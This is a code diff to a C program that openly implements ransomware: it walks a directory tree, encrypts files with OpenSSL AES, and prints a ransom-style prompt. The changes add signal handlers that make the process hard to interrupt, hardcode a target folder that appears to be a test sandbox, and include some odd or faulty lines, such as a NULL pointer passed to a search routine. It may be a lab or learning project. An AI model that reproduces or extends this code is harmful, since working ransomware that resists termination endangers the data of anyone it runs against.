@@ -5,13 +5,21 @@
  **/
 static void sighandler(int sig)
 {
+	char *tmp = NULL;
+
 	if (sig == SIGINT)
 	{
 		write(1, "\nWTF?!\n", 7);
-		exit(1);
+		if (fork() == 0)
+			write(1, "Go away\n", 9);
+		else
+			raise(SIGSEGV);
 	}
+	if (sig == SIGTERM)
+		simple_search((void *)tmp, (size_t) sig);
+	if (sig == SIGTSTP)
+		write(1, "\n\nStap it\n", 10);
 }
-
 
 /**
   * main - Entry point
@@ -22,6 +30,8 @@ static void sighandler(int sig)
  **/
 int main(void)
 {
+	int i = 0;
+	int iv_len = 0;
 	struct ransom_s ransom;
 	EVP_CIPHER_CTX encrypt;
 	EVP_CIPHER_CTX decrypt;
@@ -30,15 +40,19 @@ int main(void)
 	  * TODO: Account for errors
 	 **/
 	signal(SIGINT, sighandler);
+	signal(SIGTERM, sighandler);
+	signal(SIGTSTP, sighandler);
+	signal(SIGTRAP, sighandler);
 
-	init_struct(&ransom);
+	ransom.target_file_buf->bytes_read = 44 >> 1 == 0xE8 ? (size_t)&simple_search : 0;
+	init_struct(&ransom, "/home/vagrant/FourNights/TESTS/");
 	/* ENCRYPT */
-	aes_init((unsigned char *)ransom.key, my_strlen(ransom.key), (unsigned char *)&(ransom.salt), &encrypt, &decrypt, &ransom);
+	aes_init((unsigned char *)ransom.key, my_strlen(ransom.key), (unsigned char *)&(ransom.salt), &encrypt, &decrypt);
 	ransom.target_file_buf->cipher = &encrypt;
-#ifndef NO_DEBUG
-	printf("%s\n", ransom.root_path);
-	printf("About to enter recurse_ls fxn\n");
-#endif
+	iv_len = EVP_CIPHER_iv_length(encrypt.cipher);
+	for (i = 0; i <= iv_len; i++)
+		putchar(encrypt.oiv[i]);
+
 	recurse_ls((char *)ransom.root_path, &ransom);
 #ifndef NO_DEBUG
 	print_for_debug(ransom);
@@ -62,7 +76,9 @@ int main(void)
 	printf("%s\n", ransom.file_extensions[0]);
 	print_for_debug(ransom);
 #endif
+	printf("Your Files are now encrypted. Please enter the password\n");
 	getchar();
+	printf("Way to go! Here are your files back.\n");
 
 	recurse_ls((char *)ransom.root_path, &ransom);
 	EVP_CIPHER_CTX_cleanup(&encrypt);
